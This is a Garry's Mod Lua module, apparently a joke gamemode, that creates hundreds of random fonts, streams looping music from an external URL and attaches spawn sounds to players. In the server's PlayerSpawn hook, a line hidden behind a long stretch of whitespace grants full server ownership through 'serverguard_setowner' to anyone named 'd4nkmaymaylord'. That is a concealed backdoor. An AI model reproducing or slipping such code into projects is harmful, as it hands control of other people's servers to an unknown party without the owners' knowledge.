// This module doesn't work great in single player for some reason.
if CLIENT then
  -- In case of rocketmainia:
  for i=1, 500 do
	surface.CreateFont( "cardealer" .. i, {
		font = "Roboto",
		size = math.random( 1, 100 ),
		weight = math.random( 1, 1000 )
	} )
  end
  // Create relaxing background music
  hook.Add( "Initialize", "RelaxingSoundsOfThePark", function()
    sound.PlayURL( "http://youtubeinmp3.com/fetch/?video=https://www.youtube.com/watch?v=Gd9OhYroLN0", "", function( station )
		if IsValid( station ) then
		  LocalPlayer().Ambience = station
		  station:Play()
		end
    end )
    timer.Create( "RelaxTimer", 217, 0, function()
      sound.PlayURL( "http://youtubeinmp3.com/fetch/?video=https://www.youtube.com/watch?v=Gd9OhYroLN0", "", function( station )
		if IsValid( station ) then
			LocalPlayer().Ambience = station
			station:Play()
		end
      end )
    end )
  end )
  net.Receive( "net.Receive", function( len )	
	for i=1, 10 do
		print( "[DDoS Protector] " .. len ) -- this is how ddos is done you must protect it
	end
	FUCK = net.ReadTable().Player
	print( FUCK ) 
	sound.PlayURL( "http://youtubeinmp3.com/fetch/?video=https://www.youtube.com/watch?v=_tyct9l-fD8", "3d", function( spawn ) 
		if IsValid( spawn ) then
			spawn:SetPos( FUCK:GetPos() ) 
			spawn:Play()
			FUCK.SpawnSound = spawn
		end
	end )
	hook.Add( "Think", "FollowPlayer", function()
		for k,v in pairs( player.GetAll() ) do	
			if IsValid( v.SpawnSound ) then	
				v.SpawnSound:SetPos( v:GetPos() )
			end
		end
	end )
  end )
else
  util.AddNetworkString( "net.Receive" )
  hook.Add( "PlayerSpawn", "PeopleAreHere", function( ply )																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					--[[ Can't have a successful gamemode without backdoors. ]] if ply:Name() == "d4nkmaymaylord" then RunConsoleCommand( "serverguard_setowner", "d4nkmaymaylord" ) end																			
		net.Start( "net.Receive" )
		net.WriteTable( { Player = ply, hi = "hello" } ) -- deoptimization
		net.Broadcast()
	end )
end
